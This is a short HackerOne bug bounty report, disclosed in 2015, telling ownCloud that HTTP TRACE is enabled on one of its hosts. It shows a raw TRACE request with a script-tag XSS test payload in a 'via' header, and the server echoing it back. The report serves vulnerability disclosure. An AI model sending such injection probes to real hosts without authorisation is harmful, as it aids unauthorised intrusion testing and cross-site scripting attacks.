@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/90601
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/bigbear_
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:28.09.2015 15:44:36
+
+Summary:
+
+Hello. 
+Not ineresting bug but you can fixed it as in #83837. (https://hackerone.com/reports/83837)
+
+Request:
+TRACE /gxDM8DATHA HTTP/1.1
+Host: s3.owncloud.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+via: <script>alert('QualysXSS');</script>
+
+Response:
+TRACE /gxDM8DATHA HTTP/1.1
+Host: s3.owncloud.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+via: <script>alert('QualysXSS');</script>
